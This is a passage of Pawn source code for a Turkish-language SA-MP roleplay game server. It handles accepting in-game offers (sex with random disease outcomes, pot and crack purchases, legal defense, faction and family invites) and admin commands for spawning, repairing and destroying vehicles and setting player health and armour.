                                        if(STD3[rand] == 0) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seks yaparken 30 Can aldýnýz ve hiç cinsel hastalýk virüsü kapmadýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seks yaparken cinsel hastalýk kapmadýnýz."); }
                                        else if(STD3[rand] == 1) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 30 Can + AIDS enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir AIDS kaptýnýz."); }
                                        else if(STD3[rand] == 2) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 30 Can + Belsoðukluðu enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir Belsoðukluðu kaptýnýz."); }
                                        else if(STD3[rand] == 3) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 30 Can + Frengi enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir Frengi kaptýnýz."); }
                                    }
                                    else if(level >= 200 && level < 400) {
                                        GetPlayerHealth(playerid, health);
                                        if(health < 100) {
                                            if(health > 60) {
                                                SetPlayerHealth(playerid, 100);
                                            }
                                            else {
                                                SetPlayerHealth(playerid, health + 40.0);
                                            }
                                        }
                                        new rand = random(sizeof(STD4));
                                        SetPVarInt(playerid, "STD", STD4[rand]);
                                        SetPVarInt(SexOffer[playerid], "STD", STD4[rand]);
                                        if(STD4[rand] == 0) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seks yaparken 40 Can aldýnýz ve hiç cinsel hastalýk virüsü kapmadýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seks yaparken cinsel hastalýk kapmadýnýz."); }
                                        else if(STD4[rand] == 1) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 40 Can + AIDS enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir AIDS kaptýnýz."); }
                                        else if(STD4[rand] == 2) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 40 Can + Belsoðukluðu enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir Belsoðukluðu kaptýnýz."); }
                                        else if(STD4[rand] == 3) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seksten dolayý 40 Can + Frengi enfeksiyonu kaptýnýz."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Seksten dolayý bir Frengi kaptýnýz."); }
                                    }
                                    else if(level >= 400) {
                                        GetPlayerHealth(playerid, health);
                                        if(health > 50) {
                                            SetPlayerHealth(playerid, 100);
                                        }
                                        else {
                                            SetPlayerHealth(playerid, health + 50.0);
                                        }
                                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Seks Yeteneði seviyeniz çok yüksek, çok can verdiniz ve hastalýk kapmadýnýz.");
                                        SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Hayat Kadýnýnýn seks yetenek seviyesi çok yüksek, size çok can verdi ve hastalýk bulaþtýrmadý.");
                                    }
                                }
                                else {
                                    SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Kiþi kondom kullandý.");
                                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kondom kullandýnýz.");
                                    Condom[playerid] --;
                                }
                            }
                            else {
                                SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* Kiþi zaten cinsel hastalýk kapmýþ, baþka birini daha kapamaz.");
                            }
                            SexOffer[playerid] = 999;
                            return 1;
                        }
                        else {
                            SendClientMessage(playerid, COLOR_GREY, "   Sen veya Hayat Kadýný arabada deðilsiniz!");
                            return 1;
                        }
                    }                             //Connected or not
                    return 1;
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   Sekse yeterli paranýz yok!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Bir Hayat Kadýnýndan seks teklifi almadýnýz!");
                return 1;
            }
        }
        else if(strcmp(params,"pot",true) == 0) {
            if(PotOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) > PotPrice[playerid]) {
                    if(PlayerInfo[playerid][pPot] < 25) {
                        if(IsPlayerConnected(PotOffer[playerid])) {
							if(PlayerInfo[PotOffer[playerid]][pPot] < PotGram[playerid])
							{
						    	SendClientMessage(playerid,COLOR_GREY, "Kiþi o kadar pot'a sahip deðil!");
						    	return 1;
							}
                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(PotOffer[playerid], ipex, sizeof(ipex));
                            //format(string, sizeof(string), "[POT (%d GRAMS)] %s (IP:%s) has paid $%d to %s (IP:%s)", PotGram[playerid], GetPlayerNameEx(playerid), ip, PotPrice[playerid], GetPlayerNameEx(PotOffer[playerid]), ipex);
                            //Log("logs/pay.log", string);*/

                            PotWarn[playerid][PotOffer[playerid]] += PotPrice[playerid];
                            if(PotWarn[playerid][PotOffer[playerid]] >= 2500 && (PlayerInfo[PotOffer[playerid]][pLevel] <= 3 || PlayerInfo[PotOffer[playerid]][pLevel] <= 3)) {
                                format(string, sizeof(string), "%s (IP:%s) kiþisi %s (IP:%s) kiþisine $%d deðerinde pot sattý.", GetPlayerNameEx(PotOffer[playerid]), ipex, GetPlayerNameEx(playerid), ip, PotWarn[playerid][PotOffer[playerid]]);
                                //Log("logs/pay.log", string);
                                ABroadCast(COLOR_YELLOW, string, 1);
                            }

                            GetPlayerName(PotOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* %d gramý $%d karþýlýðýnda Uyuþturucu Satýcýsý %s kiþisinden aldýnýz.",PotGram[playerid],PotPrice[playerid],giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s kiþisi sizden %d gram aldý, $%d hesabýnýza eklendi.",sendername,PotGram[playerid],PotPrice[playerid]);
                            SendClientMessage(PotOffer[playerid], COLOR_LIGHTBLUE, string);
                            PlayerInfo[PotOffer[playerid]][pCash] += PotPrice[playerid];

                            #if defined DOUBLE_EXP_ENABLED
								new hour,minuite,second;
								gettime(hour,minuite,second);
								if(DoubleEXPcheck(hour))
								{
				    				PlayerInfo[PotOffer[playerid]][pDrugsSkill] += 2;
				    				SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
								}
								else
								{
									SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
									PlayerInfo[PotOffer[playerid]][pDrugsSkill]++;
								}
							#else
                                PlayerInfo[PotOffer[playerid]][pDrugsSkill]++;
							#endif

                            GivePlayerCash(playerid, -PotPrice[playerid]);
                            PlayerInfo[playerid][pPot] += PotGram[playerid];
                            PlayerInfo[PotOffer[playerid]][pPot] -= PotGram[playerid];
                            if(PlayerInfo[PotOffer[playerid]][pDrugsSkill] == 50)
                            { SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "* Uyuþturucu Satýcýsý yeteneðiniz Level 2 oldu, daha çok gram ve ucuza alabilirsiniz."); }
                            else if(PlayerInfo[PotOffer[playerid]][pDrugsSkill] == 100)
                            { SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "* Uyuþturucu Satýcýsý yeteneðiniz Level 3 oldu, daha çok gram ve ucuza alabilirsiniz."); }
                            else if(PlayerInfo[PotOffer[playerid]][pDrugsSkill] == 200)
                            { SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "* Uyuþturucu Satýcýsý yeteneðiniz Level 4 oldu, daha çok gram ve ucuza alabilirsiniz."); }
                            else if(PlayerInfo[PotOffer[playerid]][pDrugsSkill] == 400)
                            { SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "* Uyuþturucu Satýcýsý yeteneðiniz Level 5 oldu, daha çok gram ve ucuza alabilirsiniz."); }
                            PotOffer[playerid] = 999;
                            PotPrice[playerid] = 0;
                            PotGram[playerid] = 0;
                            return 1;
                        }
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   Uyuþturucuyla dolusunuz, önce onlarý kullanýn!");
                        return 1;
                    }
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   Potlar için yeterli paranýz yok!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size Pot önermedi!");
                return 1;
            }
        }
        else if(strcmp(params,"crack",true) == 0) {
            if(CrackOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) > CrackPrice[playerid]) {
                    if(PlayerInfo[playerid][pCrack] < 25) {
                        if(IsPlayerConnected(CrackOffer[playerid])) {
 							if(PlayerInfo[CrackOffer[playerid]][pCrack] < CrackGram[playerid])
							{
						    	SendClientMessage(playerid,COLOR_GREY, "Kiþi o kadar crack'e sahip deðil!");
						    	return 1;
							}
                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(CrackOffer[playerid], ipex, sizeof(ipex));
                            //format(string, sizeof(string), "[CRACK DEAL (%d GRAMS)] %s (IP:%s) has paid $%d to %s (IP:%s)", CrackGram[playerid], GetPlayerNameEx(playerid), ip, CrackPrice[playerid], GetPlayerNameEx(CrackOffer[playerid]), ipex);
                            // Log("logs/pay.log", string);

                            CrackWarn[playerid][CrackOffer[playerid]] += CrackPrice[playerid];
                            if(CrackWarn[playerid][CrackOffer[playerid]] >= 2500 && (PlayerInfo[CrackOffer[playerid]][pLevel] <= 3 || PlayerInfo[CrackOffer[playerid]][pLevel] <= 3)) {
                                format(string, sizeof(string), "%s (IP:%s) kiþisi %s (IP:%s) kiþisine $%d deðerinde pot sattý.", GetPlayerNameEx(CrackOffer[playerid]), ipex, GetPlayerNameEx(playerid), ip, CrackWarn[playerid][CrackOffer[playerid]]);
                                ABroadCast(COLOR_YELLOW, string, 1);
                            }

                            GivePlayerCash(playerid, -CrackPrice[playerid]);
                            GivePlayerCash(CrackOffer[playerid], CrackPrice[playerid]);
                            GetPlayerName(CrackOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* %d gramý $%d karþýlýðýnda Uyuþturucu Satýcýsý %s kiþisinden aldýnýz.",CrackGram[playerid],CrackPrice[playerid],giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s kiþisi sizden %d gram aldý, $%d hesabýnýza eklendi.",sendername,CrackGram[playerid],CrackPrice[playerid]);
                            SendClientMessage(CrackOffer[playerid], COLOR_LIGHTBLUE, string);

							#if defined DOUBLE_EXP_ENABLED
	     						new hour,minuite,second;
								gettime(hour,minuite,second);
								if(DoubleEXPcheck(hour))
								{
				    				PlayerInfo[CrackOffer[playerid]][pDrugsSkill] += 2;
				    				SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
								}
								else
								{
									SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
									PlayerInfo[CrackOffer[playerid]][pDrugsSkill]++;
								}
							#else
                            	PlayerInfo[CrackOffer[playerid]][pDrugsSkill]++;
                            #endif

                            PlayerInfo[playerid][pCrack] += CrackGram[playerid];
                            PlayerInfo[CrackOffer[playerid]][pCrack] -= CrackGram[playerid];
                            if(PlayerInfo[CrackOffer[playerid]][pDrugsSkill] == 50)
                            { SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "* Uyuþturucu Satýcýsý yeteneðiniz Level 2 oldu, daha çok gram ve ucuza alabilirsiniz."); }
                            else if(PlayerInfo[CrackOffer[playerid]][pDrugsSkill] == 100)
                            { SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "* Uyuþturucu Satýcýsý yeteneðiniz Level 2 oldu, daha çok gram ve ucuza alabilirsiniz."); }
                            else if(PlayerInfo[CrackOffer[playerid]][pDrugsSkill] == 200)
                            { SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "* Uyuþturucu Satýcýsý yeteneðiniz Level 2 oldu, daha çok gram ve ucuza alabilirsiniz."); }
                            else if(PlayerInfo[CrackOffer[playerid]][pDrugsSkill] == 400)
                            { SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "* Uyuþturucu Satýcýsý yeteneðiniz Level 2 oldu, daha çok gram ve ucuza alabilirsiniz."); }
							CrackOffer[playerid] = 999;
                            CrackPrice[playerid] = 0;
                            CrackGram[playerid] = 0;
                            return 1;
                        }
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   Crack ile dolusunuz, önce onlarý kullanýn!");
                        return 1;
                    }
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   Crack için yeterli paranýz yok!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size Crack önermedi!");
                return 1;
            }
        }
        else if(strcmp(params,"koru",true) == 0) {
            if(DefendOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) > DefendPrice[playerid]) {
                    if(IsPlayerConnected(DefendOffer[playerid])) {
                        if(IsPlayerInAnyVehicle(playerid))
                            return SendClientMessage(playerid, COLOR_GREY, "Savunmayý kabul ettiðinizde araçta olamazsýnýz.");

						if(PlayerCuffed[playerid] > 0)
						    return SendClientMessage(playerid, COLOR_GREY, "Kelepçeli veya þokluyken savunma kabul edemezsiniz.");

                        PlayerInfo[playerid][pWantedLevel]--;
                        SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWantedLevel]);
                        SetPlayerToTeamColor(playerid);
                        giveplayer = GetPlayerNameEx(DefendOffer[playerid]);
                        sendername = GetPlayerNameEx(playerid);
                        format(string, sizeof(string), "* $%d karþýlýðýnda savunmayý kabul ettiniz, Avukat: %s.",DefendPrice[playerid],giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* %s kiþisi savunmanýzý kabul etti, $%d hesabýnýza eklendi.",sendername,DefendPrice[playerid]);
                        SendClientMessage(DefendOffer[playerid], COLOR_LIGHTBLUE, string);

						#if defined DOUBLE_EXP_ENABLED
							new hour,minuite,second;
							gettime(hour,minuite,second);
							if(DoubleEXPcheck(hour))
							{
				    			PlayerInfo[DefendOffer[playerid]][pLawSkill] += 2;
				    			SendClientMessage(DefendOffer[playerid], COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
							}
							else
							{
								SendClientMessage(DefendOffer[playerid], COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
								PlayerInfo[DefendOffer[playerid]][pLawSkill]++;
							}
						#else
                        	PlayerInfo[DefendOffer[playerid]][pLawSkill]++;
                        #endif

                        GivePlayerCash(DefendOffer[playerid],DefendPrice[playerid]);
                        GivePlayerCash(playerid, -DefendPrice[playerid]);
                        DefendOffer[playerid] = 999;
                        DefendPrice[playerid] = 0;
                        return 1;
                    }
                    return 1;
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   Koruma için yeterli paranýz yok!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size Koruma önermedi!");
                return 1;
            }
        }
        else if(strcmp(params,"olusum",true) == 0) {
            if(InviteOffer[playerid] < 999) {
                if(IsPlayerConnected(InviteOffer[playerid])) {

                    if(GetPVarInt(playerid, "PBM") > 0) {
                        SendClientMessage(playerid, COLOR_WHITE, "Paintball oynarken bunu yapamazsýnýz.");
                        return 1;
                    }

                    if(InviteFaction[playerid] > 0 && InviteFamily[playerid] == 255) {
						PlayerInfo[playerid][pFaction] = InviteFaction[playerid];
                        PlayerInfo[playerid][pRank] = 0;
                        PlayerInfo[playerid][pDivision] = 0;

						format(string, sizeof(string), "%s kiþisi %s kiþisinin davetini %s için kabul etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(InviteOffer[playerid]), GetFactionName(InviteFaction[playerid]));
						Log("logs/faction.log", string);
                        format(string, sizeof(string), "   Daveti kabul ettiniz ve %s kuruluþuna katýldýnýz, Daveti Gönderen: %s.", GetFactionName(InviteFaction[playerid]), GetPlayerNameEx(InviteOffer[playerid]));
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "   %s kiþisi davetinizi kabul etti ve %s kuruluþuna katýldý.", GetPlayerNameEx(playerid), GetFactionName(InviteFaction[playerid]));
                        SendClientMessage(InviteOffer[playerid], COLOR_LIGHTBLUE, string);
                        InviteOffer[playerid] = 999;
                        InviteFaction[playerid] = 0;
                        InviteFamily[playerid] = 255;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse sizi organizasyon/aileye davet etmedi!");
                return 1;
            }
        }
        else if(strcmp(params,"aile",true) == 0) {
            if(InviteOffer[playerid] < 999) {
                if(IsPlayerConnected(InviteOffer[playerid])) {
                    if(InviteFaction[playerid] == 0 && InviteFamily[playerid] != 255) {
                        if(GetPVarInt(playerid, "PBM") > 0) {
                            SendClientMessage(playerid, COLOR_WHITE, "Paintball oynarken bunu yapamazsýnýz.");
                            return 1;
                        }

                        if(PlayerInfo[playerid][pJailTime] > 1) {
                            SendClientMessage(playerid, COLOR_WHITE, "Daveti kabul etmeden önce hapisten serbest býrakýlana kadar bekleyiniz.");
                            return 1;
                        }

                        if(PlayerInfo[playerid][pFaction] >= 3 || PlayerInfo[playerid][pGang] != 255 || PlayerInfo[playerid][pLeader] >= 3 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2) {
                            SendClientMessage(playerid, COLOR_WHITE, "Zaten bir aile/organizasyonda olduðunuzdan daveti kabul edemezsiniz.");
                        }
                        else {
                            PlayerInfo[playerid][pGang] = InviteFamily[playerid];
                            PlayerInfo[playerid][pRank] = 1;
                            FamilyInfo[InviteFamily[playerid]][FamilyMembers] ++;
                            SaveFamilies();
                            format(string, sizeof(string), "   Daveti kabul ettiniz ve %s kuruluþuna katýldýnýz, Daveti Gönderen: %s.", FamilyInfo[InviteFamily[playerid]][FamilyName], GetPlayerNameEx(InviteOffer[playerid]));
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "   %s kiþisi davetinizi kabul etti ve %s kuruluþuna katýldý.", GetPlayerNameEx(playerid),FamilyInfo[InviteFamily[playerid]][FamilyName]);
                            SendClientMessage(InviteOffer[playerid], COLOR_LIGHTBLUE, string);
                            SendClientMessage(playerid, COLOR_WHITE, "Aile sohbeti için (/f) komutunu kullanýn. Aile skini almak isterseniz, giyim maðazasýnda /kiyafetler komutunu kullanýn.");

                            InviteOffer[playerid] = 999;
                            InviteFaction[playerid] = 0;
                            InviteFamily[playerid] = 255;
                        }
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse sizi organizasyon/aileye davet etmedi!");
                return 1;
            }
        }
	}
	return 1;
}

CMD:maaszamani(playerid, params[])
{
	return cmd_paycheck(playerid, params);
}

CMD:paycheck(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
	    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
    	foreach(Player, i)
    	{
        	if(WasHereForPaycheck[i] == 1)
        	{
        	    SendClientMessage(playerid,COLOR_WHITE, "Son maaþýn kodlarý henüz sonra ermedi.");
        	    return 1;
        	}
	    }
		PayDay();
	}
	return 1;
}

CMD:veh(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4) {
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

		new
			iVehicle,
			iColors[2];

		if(sscanf(params, "iI(-1)I(-1)", iVehicle, iColors[0], iColors[1]))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /veh [model ID] [(optional) color 1] [(optional) color 2]");
		}
		else if(!(400 <= iVehicle <= 611))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz model seçildi (model ID si 400 ile 611 arasýndadýr).");
		}
  		else if(iColors[0] < -1 || iColors[0] > 255 || iColors[1] < -1 || iColors[1] > 255) {
			SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz renk seçildi (ID -1 ile 255 arasýndadýr).");
		}
		else if(CreatedCarsCount >= 50)
		{
		    SendClientMessage(playerid, COLOR_GRAD2, "Ayný anda maksimum 50 araba çýkarýlabilir. /destroycar ya da  /destroycars yazýn");
		    return 1;
		}
		else for(new iIterator; iIterator < sizeof(CreatedCars); iIterator++) if(CreatedCars[iIterator] == INVALID_VEHICLE_ID)
		{
			new
				Float: fVehPos[4];

			GetPlayerPos(playerid, fVehPos[0], fVehPos[1], fVehPos[2]);
			GetPlayerFacingAngle(playerid, fVehPos[3]);
			CreatedCars[iIterator] = CreateVehicle(iVehicle, fVehPos[0], fVehPos[1], fVehPos[2], fVehPos[3], iColors[0], iColors[1], -1);
			CreatedCarsCount++;
			LinkVehicleToInterior(CreatedCars[iIterator], GetPlayerInterior(playerid));
			return SendClientMessage(playerid, COLOR_GREY, "Araç çýktý!");
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:vehname(playerid, params[])
{

	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		SendClientMessage(playerid, COLOR_CYAN,"___________________________________________________________________________________________________");
		SendClientMessage(playerid, COLOR_WHITE, "Araç Arama:");

		new
			string[128];

		if(isnull(params)) return SendClientMessage(playerid, COLOR_GREY, "Anahtar kelime belirlenmedi.");
		if(!params[2]) return SendClientMessage(playerid, COLOR_GREY, "Aranan kelime çok kýsa.");

		for(new v; v < sizeof(VehicleName); v++) {
			if(strfind(VehicleName[v], params, true) != -1) {

				if(isnull(string)) format(string, sizeof(string), "%s (ID %d)", VehicleName[v], v+400);
				else format(string, sizeof(string), "%s | %s (ID %d)", string, VehicleName[v], v+400);
			}
		}

		if(!string[0]) SendClientMessage(playerid, COLOR_GREY, "Sonuç bulunamadý.");
		else if(string[127]) SendClientMessage(playerid, COLOR_GREY, "Çok fazla sonuç bulundu.");
		else SendClientMessage(playerid, COLOR_WHITE, string);

		SendClientMessage(playerid, COLOR_CYAN,"___________________________________________________________________________________________________");
	}
	return 1;
}

CMD:fixveh(playerid, params[])
{
    if(IsPlayerConnected(playerid))
	{
        if(PlayerInfo[playerid][pAdmin] < 4)
		{
            SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
            return 1;
        }
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
        if(IsPlayerInAnyVehicle(playerid))
		{
            RepairVehicle(GetPlayerVehicleID(playerid));
            SendClientMessage(playerid, COLOR_GREY, "Araç tamir edildi!");
        }
    }
    return 1;
}


CMD:fixvehall(playerid, params[])
{
    if(IsPlayerConnected(playerid)) {
        if(PlayerInfo[playerid][pAdmin] < 5)
		{
            SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
            return 1;
        }
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
        for(new v = 0; v < MAX_VEHICLES; v++) {
            RepairVehicle(v);
        }
        SendClientMessage(playerid, COLOR_GREY, "Tüm araçlar tamir edildi!");
    }
    return 1;
}

CMD:destroycars(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 4)
	{
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
        return 1;
    }
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}
    for(new i = 0; i < sizeof(CreatedCars); i++)
	{
        if(CreatedCars[i] != INVALID_VEHICLE_ID)
		{
            DestroyVehicle(CreatedCars[i]);
            VehicleRadioStation[CreatedCars[i]] = 0;
            CreatedCarsCount = 0;
            CreatedCars[i] = INVALID_VEHICLE_ID;
        }
    }
    SendClientMessage(playerid, COLOR_GREY, "Çýkan arabalar yok edildi!");
    return 1;
}

CMD:destroycar(playerid, params[])
{
	new string[128];

	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
 	}
	new bool:breakingloop = false, newid = INVALID_VEHICLE_ID;
	if(IsPlayerInAnyVehicle(playerid))
	{
		for(new i=0;i<sizeof(CreatedCars);i++)
		{
			if(!breakingloop)
			{
				if(CreatedCars[i] == GetPlayerVehicleID(playerid)) // Checking for next available ID.
				{
					breakingloop = true;
					newid = i;
				}
			}
		}
		if(newid != INVALID_VEHICLE_ID)
		{
			new carid = GetPlayerVehicleID(playerid);
			DestroyVehicle(carid);
            VehicleRadioStation[carid] = 0;
			CreatedCarsCount--;
			CreatedCars[newid] = INVALID_VEHICLE_ID;
			format(string, sizeof(string), "Araç %d yok edildi.", carid);
			SendClientMessage(playerid, COLOR_GREY, string);
		}
	}
	return 1;
}

CMD:healnear(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
        new string[128];
        new count;
        foreach(Player, i) {
            if(ProxDetectorS(12.0, playerid, i)) {
                SetPlayerHealth(i, 100);
                SetPlayerArmourEx(i, 100);
                count++;
            }
        }
        format(string, sizeof(string), "Yakýndaki herkese (%d) canýný doldurdun.", count);
        SendClientMessage(playerid, COLOR_WHITE, string);
    }
    return 1;
}

CMD:sethp(playerid, params[])
{
    new string[128], playa, health;
    if(sscanf(params, "ud", playa, health))
	{
        SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /sethp [Oyuncu ID/Ýsim] [health]");
        return 1;
    }
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
        if(IsPlayerConnected(playa)) {
            if(playa != INVALID_PLAYER_ID)
			{
                SetPlayerHealth(playa, health);
                format(string, sizeof(string), " %s adlý kiþinin canýný %d olarak deðiþtirdin.", GetPlayerNameEx(playa), health);
                SendClientMessage(playerid, COLOR_WHITE, string);
            }
        }
        else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:setarmor(playerid, params[])
{
    new string[128], playa, health;
    if(sscanf(params, "ud", playa, health))
	{
        SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /setarmor [Oyuncu ID/Ýsim] [armor]");
        return 1;
    }
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
        if(IsPlayerConnected(playa))
		{
            if(playa != INVALID_PLAYER_ID)
			{
                SetPlayerArmourEx(playa, health);
                format(string, sizeof(string), " %s adlý kiþinin zýrhýný %d olarak deðiþtirdin.", GetPlayerNameEx(playa), health);
                SendClientMessage(playerid, COLOR_WHITE, string);
            }
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:setarmorall(playerid, params[])
{
    new armor;
    if(sscanf(params, "d", armor)) {
        SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /setarmorall [armor]");
        return 1;
    }

    if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
        foreach(Player, i)
		{
            SetPlayerArmourEx(i, armor);
        }
    }

    else {
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:givegun(playerid, params[])
{
